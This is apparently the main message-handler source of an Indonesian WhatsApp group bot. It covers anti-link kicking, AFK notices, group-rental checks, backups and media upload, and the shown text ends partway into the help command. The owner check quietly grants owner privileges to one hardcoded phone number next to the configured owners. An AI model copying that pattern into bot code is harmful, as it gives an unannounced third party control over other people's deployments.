
require('./owner-dan-menu')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadMediaMessage, downloadContentFromMessage } = require('@adiwajshing/baileys')


const helpCooldown = new Map();
const cheerio = require('cheerio')
const fs = require('fs');
const util = require('util');
const chalk = require('chalk');
const axios = require('axios');
const { exec } = require("child_process");
const moment = require('moment-timezone');
const ms = toMs = require('ms');
const FormData = require("form-data");
const { fromBuffer } = require('file-type')
const fetch = require('node-fetch')
let set_bot = JSON.parse(fs.readFileSync('./database/set_bot.json'));
const calc = require("./lib/calcml")
const { smsg, fetchJson, getBuffer } = require('./lib/simple')
const { createSticker, StickerTypes } = require("wa-sticker-formatter");
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'));
let _left = JSON.parse(fs.readFileSync('./database/left.json'));
let set_open = JSON.parse(fs.readFileSync('./database/set_open.json'));
let set_close = JSON.parse(fs.readFileSync('./database/set_close.json'));
const { 
  isSetBot,
    addSetBot,
    removeSetBot,
    changeSetBot,
    getTextSetBot,
  updateResponList,
  delResponList,
  resetListAll,
  isAlreadyResponListGroup,
  sendResponList,
  isAlreadyResponList,
  getDataResponList,
  addResponList,
  isSetClose,
    addSetClose,
    removeSetClose,
    changeSetClose,
    getTextSetClose,
    isSetDone,
    addSetDone,
    removeSetDone,
    changeSetDone,
    getTextSetDone,
    isSetLeft,
    addSetLeft,
    removeSetLeft,
    changeSetLeft,
    getTextSetLeft,
    isSetOpen,
    addSetOpen,
    removeSetOpen,
    changeSetOpen,
    getTextSetOpen,
    isSetProses,
    addSetProses,
    removeSetProses,
    changeSetProses,
    getTextSetProses,
    isSetWelcome,
    addSetWelcome,
    removeSetWelcome,
    changeSetWelcome,
    getTextSetWelcome,
    addSewaGroup,
    getSewaExpired,
    getSewaPosition,
    expiredCheck,
    checkSewaGroup,
    addPay,
    updatePay
} = require("./lib/store")
const { GoogleGenerativeAI, HarmCategory, HarmBlockThreshold } = require("@google/generative-ai");
const { ytmp3, ytmp4, igdl, fbdl} = require("ruhend-scraper");
// const Upscaler = require("upscaler");
// const models = require('@upscalerjs/esrgan-thick');
// const { downloadMediaMessage } = require("baileys");

const afkFilePath = './database/afk_user.json';

let afkUsers = {}; // Penyimpanan status AFK

// Fungsi untuk memuat data AFK dari file
function loadAFKUsers() {
  try {
    const data = fs.readFileSync(afkFilePath, 'utf8');
    afkUsers = JSON.parse(data);
  } catch (error) {
    afkUsers = {};
  }
}

// Fungsi untuk menyimpan data AFK ke file
function saveAFKUsers() {
  fs.writeFileSync(afkFilePath, JSON.stringify(afkUsers, null, 2));
}

// Memanggil loadAFKUsers saat awal berjalan
loadAFKUsers();

function setAFK(userJid, reason) {
  const timeNow = Date.now();
  afkUsers[userJid] = {
    reason: reason,
    time: timeNow,
  };
  saveAFKUsers(); // Simpan data ke file setiap kali ada perubahan
}

function getAFKStatus(userJid) {
  return afkUsers[userJid];
}

function removeAFK(userJid) {
  delete afkUsers[userJid];
  saveAFKUsers(); // Simpan data ke file setiap kali ada perubahan
}

function formatTimeAgo(time) {
  const now = Date.now();
  const diff = now - time;
  const seconds = Math.floor(diff / 1000);
  const minutes = Math.floor(seconds / 60);
  const hours = Math.floor(minutes / 60);

  if (hours > 0) return `${hours} jam yang lalu`;
  if (minutes > 0) return `${minutes} menit yang lalu`;
  return `${seconds} detik yang lalu`;
}




async function getGroupAdmins(participants){
        let admins = []
        for (let i of participants) {
            i.admin === "superadmin" ? admins.push(i.id) :  i.admin === "admin" ? admins.push(i.id) : ''
        }
        return admins || []
}

async function TelegraPh(buffer) {
const axios = require('axios');
const FormData = require('form-data');
    return new Promise(async (resolve, reject) => {
        try {
            const form = new FormData();
            //form.append('image', buffer, { filename: 'image.png' });
            form.append('image', fs.createReadStream(buffer)); // gunakan key 'file' dan path file

            const response = await axios.post(`https://cekid.zannstore.com/v2/foto-url?api_req=idsAPITOLS`, form, {
                headers: {
                    ...form.getHeaders(),
                },
            });

            console.log('API Response:', response.data);

            if (response.data.status === 'success' && response.data.url) {
                return resolve(response.data.url);
            } else {
                return reject(new Error("Unexpected response from API: " + JSON.stringify(response.data)));
            }
        } catch (err) {
            console.error("Error uploading to the API:", err.response ? err.response.data : err.message);
            return reject(new Error(`Error uploading file: ${err.message}`));
        }
    });
}

async function createBackupZip() {
  const path = require('path');
  const archiver = require('archiver');

  return new Promise((resolve, reject) => {
      const outputPath = path.join(__dirname, 'backup.zip');
      const output = fs.createWriteStream(outputPath);
      const archive = archiver('zip', {
          zlib: { level: 9 }
      });

      output.on('close', () => {
          console.log(`backup berhasil dilakukan total file yang didapatkan ${outputPath} (${archive.pointer()} total bytes`);
          resolve(outputPath);
      });

      archive.on('error', (err) => {
          reject(err);
      });

      archive.pipe(output);


      archive.glob('database/**/*');
        archive.glob('image/**/*');
        archive.glob('lib/**/*');
     


      archive.finalize();
  });
}



function runtime(seconds) {

    seconds = Number(seconds);

    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor(seconds % (3600 * 24) / 3600);
    var m = Math.floor(seconds % 3600 / 60);
    var s = Math.floor(seconds % 60);
    var dDisplay = d > 0 ? d + (d == 1 ? " Hari " : " Hari ") : "";
    var hDisplay = h > 0 ? h + (h == 1 ? " Jam " : " Jam ") : "";
    var mDisplay = m > 0 ? m + (m == 1 ? " Menit " : " Menit ") : "";
    var sDisplay = s > 0 ? s + (s == 1 ? " Detik " : " Detik ") : "";
    return dDisplay + hDisplay + mDisplay + sDisplay;
}
function msToDate(mse) {
               temp = mse
               days = Math.floor(mse / (24 * 60 * 60 * 1000));
               daysms = mse % (24 * 60 * 60 * 1000);
               hours = Math.floor((daysms) / (60 * 60 * 1000));
               hoursms = mse % (60 * 60 * 1000);
               minutes = Math.floor((hoursms) / (60 * 1000));
               minutesms = mse % (60 * 1000);
               sec = Math.floor((minutesms) / (1000));
               return days + " Days " + hours + " Hours " + minutes + " Minutes";
            } 
            
const isUrl = (url) => {
    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}

const tanggal = (numer) => {
    myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
                myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jum’at','Sabtu']; 
                var tgl = new Date(numer);
                var day = tgl.getDate()
                bulan = tgl.getMonth()
                var thisDay = tgl.getDay(),
                thisDay = myDays[thisDay];
                var yy = tgl.getYear()
                var year = (yy < 1000) ? yy + 1900 : yy; 
                const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
                let d = new Date
                let locale = 'id'
                let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
                let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
            
                return`${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
}
module.exports = AnanthaGanz = async (AnanthaGanz, m, chatUpdate, store, opengc, setpay, antilink, antiwame, antilink2, antiwame2, set_proses, set_done, set_open, set_close, sewa, db_respon_list) => {
    try {
        var body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
) || ''
        
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await AnanthaGanz.decodeJid(AnanthaGanz.user.id)
        const isCreator = ["6281340930744@s.whatsapp.net",botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const groupMetadata = m.isGroup ? await AnanthaGanz.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isSewa = checkSewaGroup(m.chat, sewa)
        const isAntiLink = antilink.includes(m.chat) ? true : false
        const isAntiWame = antiwame.includes(m.chat) ? true : false  
        const isAntiLink2 = antilink2.includes(m.chat) ? true : false
        const isAntiWame2 = antiwame2.includes(m.chat) ? true : false  
const isWelcome = _welcome.includes(m.chat)
const isLeft = _left.includes(m.chat)
const jam = moment().format("HH:mm:ss z")
        const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
        
const reply = (text) =>{
  m.reply(text)
}
  function formatmoney(amount, options = {}) {
    const {
        currency = "IDR",
        locale = "id",
        minimumFractionDigits = 0,
        maximumFractionDigits = 0,
        useSymbol = true
    } = options;

    const formattedAmount = amount.toLocaleString(locale, {
        style: "currency",
        currency,
        minimumFractionDigits,
        maximumFractionDigits,
    });

    return useSymbol ? formattedAmount : formattedAmount.replace(/[^\d.,]/g, '');
}

function formatRupiah(amount) {
    return formatmoney(amount, { currency: "IDR", locale: "id", minimumFractionDigits: 0 });
}

async function getGcName(groupID) {
            try {
                let data_name = await AnanthaGanz.groupMetadata(groupID)
                return data_name.subject
            } catch (err) {
                return '-'
            }
        }
        if (m.message) {
            AnanthaGanz.readMessages([m.key])
            console.log(chalk.black(chalk.bgWhite('[ CMD ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Chat Pribadi', m.chat))
        }
if(m.isGroup){
    expiredCheck(AnanthaGanz, sewa)
    }
        
      if (isAntiLink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`*Antilink sedang on kamu akan dikick*`)
        if (!isBotAdmins) return m.reply(`*Bot bukan admin*`)
        let gclink = (`https://chat.whatsapp.com/`+await AnanthaGanz.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`*Gagal karena link grup ini*`)
        if (isAdmins) return m.reply(`*Admin tidak bisa dikick*`)
        if (isCreator) return m.reply(`*Owner tidak bisa dikick*`)
        if (m.key.fromMe) return m.reply(`*Owner tidak bisa dikick*`)
await AnanthaGanz.sendMessage(m.chat, {
               delete: {
                  remoteJid: m.chat,

                  fromMe: false,
                  id: m.key.id,
                  participant: m.key.participant
               }
            })
        AnanthaGanz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
      if (isAntiLink2) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return //m.reply(`*Bot bukan admin*`)
        let gclink = (`https://chat.whatsapp.com/`+await AnanthaGanz.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return //m.reply`(*Gagal karena link grup ini*`)
        if (isAdmins) return //m.reply(`*Admin tidak bisa dikick*`)
        if (isCreator) return //m.reply(`*Owner tidak bisa dikick*`)
        if (m.key.fromMe) return //m.reply(`*Owner tidak bisa dikick*`)
await AnanthaGanz.sendMessage(m.chat, {
               delete: {
                  remoteJid: m.chat,

                  fromMe: false,
                  id: m.key.id,
                  participant: m.key.participant
               }
            })
        }
        }
        if(m.mtype === "interactiveResponseMessage"){
            console.log("interactiveResponseMessage Detected!")   
            let msg = m.message[m.mtype]  || m.msg
            if(msg.nativeFlowResponseMessage  && !m.isBot  ){ 
                let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}  
                if(id){
                    let emit_msg = { 
                        key : { ...m.key } , // SET RANDOME MESSAGE ID  
                        message:{ extendedTextMessage : { text : id } } ,
                        pushName : m.pushName,
                        messageTimestamp  : m.messageTimestamp || 754785898978
                    }
                    return AnanthaGanz.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                }
            }
        }
      if (isAntiWame) {
        if (budy.match(`wa.me/`)) {
        m.reply(`*Gagal karena link grup ini*`)
        if (!isBotAdmins) return m.reply(`*Bot bukan admin*`)
        if (isAdmins) return m.reply(`*Kasian adminnya klo di kick*`)
        if (isCreator) return m.reply(`*Kasian owner ku klo di kick*`)
        if (m.key.fromMe) return m.reply(`*Kasian owner ku klo di kick*`)
await AnanthaGanz.sendMessage(m.chat, {
               delete: {
                  remoteJid: m.chat,

                  fromMe: false,
                  id: m.key.id,
                  participant: m.key.participant
               }
            })        
        AnanthaGanz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
      if (isAntiWame2) {
        if (budy.match(`wa.me/`)) {
        if (!isBotAdmins) return //m.reply(`Upsss... gajadi, bot bukan admin`)
        if (isAdmins) return //m.reply(`Upsss... gak jadi, kasian adminnya klo di kick`)
        if (isCreator) return //m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
        if (m.key.fromMe) return //m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
await AnanthaGanz.sendMessage(m.chat, {
               delete: {
                  remoteJid: m.chat,

                  fromMe: false,
                  id: m.key.id,
                  participant: m.key.participant
               }
            })        
        }
        }
      if (isAntiWame) {
        if (budy.includes((`Wa.me/`) || (`Wa.me/`))) {
        m.reply(`*「 ANTI WA ME 」*\n\nWa Me detected, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Upsss... gajadi, bot bukan admin`)
        if (isAdmins) return m.reply(`Upsss... gak jadi, kasian adminnya klo di kick`)
        if (isCreator) return m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
        if (m.key.fromMe) return m.reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
        AnanthaGanz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
        if (isAlreadyResponList((m.isGroup ? m.chat: botNumber), body.toLowerCase(), db_respon_list)) {
            var get_data_respon = getDataResponList((m.isGroup ? m.chat: botNumber), body.toLowerCase(), db_respon_list)
            if (get_data_respon.isImage === false) {
                AnanthaGanz.sendMessage(m.chat, { text: sendResponList((m.isGroup ? m.chat: botNumber), body.toLowerCase(), db_respon_list) }, {
                    quoted: m
                })
            } else {
                AnanthaGanz.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
                    quoted: m
                })
            }
        }
        /*const { Low, JSONFile } = require('./lib/lowdb')
        global.db = new Low(new JSONFile(`lib/database.json`))
        const users = global.db.users
        let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`${tag} sedang Afk ${reason ? 'karena ' + reason : 'tanpa alasan'} selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.users[m.chat].afkTime > -1) {
let user = global.db.users[m.chat]
m.reply(`${tag} telah kembali dari *Afk* ${user.afkReason ? 'setelah ' + user.afkReason : ''}\nselama *${clockString(new Date - user.afkTime)}*`.trim())
user.afkTime = -1
user.afkReason = ''
}*/
        let senderJid = m.key.participant;
         if (m.message.extendedTextMessage?.contextInfo?.mentionedJid || m.message.extendedTextMessage?.contextInfo?.participant) {
      const mentionedUsers = [
          ...(m.message.extendedTextMessage.contextInfo.mentionedJid || []),
          m.message.extendedTextMessage.contextInfo.participant
      ].filter(Boolean);

      
      for (const userJid of mentionedUsers) {
          const afkStatus = getAFKStatus(userJid);
          if (afkStatus) {
              const timeAgo = formatTimeAgo(afkStatus.time);
              await AnanthaGanz.sendMessage(
                  m.chat, 
                  {
                      text: `@${userJid.split('@')[0]} sedang AFK! \nAlasan: ${afkStatus.reason} \nWaktu AFK: ${timeAgo}`,
                      
                     // mentions: [userJid] 
                  }
              );
          }
      }
      
  } else if (afkUsers[senderJid]) {
      removeAFK(senderJid);
      // await AnanthaGanz.sendMessage(m.chat, {text: 'Ciee udah balik'});
      reply('ciee dah balik')
  }

        switch(command) {
case 'owner':
case 'creator': {
            AnanthaGanz.sendContact(m.chat, global.owner, m)
         }
         break
case 'help': {
  const cooldownTime = 9999 * 1000; // 30 detik
  const lastTime = helpCooldown.get(m.sender) || 0;
  const now = Date.now();

  if (now - lastTime < cooldownTime) {
    return reply(`Tunggu ${Math.ceil((cooldownTime - (now - lastTime))/3600)} detik sebelum gunakan .help lagi!`);
  }
  helpCooldown.set(m.sender, now);
          reply(`
╔══✦ INFORMASI ✦═══╗
🌟 𝙃𝘼𝙇𝙊, ${pushname} 🌟  
╚════════════════╝

╔══✦ DETAIL ✦══════╗
║ 🕰️ Jam: ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB
║ 📅 Tanggal: ${moment.tz('Asia/Jakarta').format('DD/MM/YYYY')}
║ ⏳ Online: ${runtime(process.uptime())}
╚════════════════╝

͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏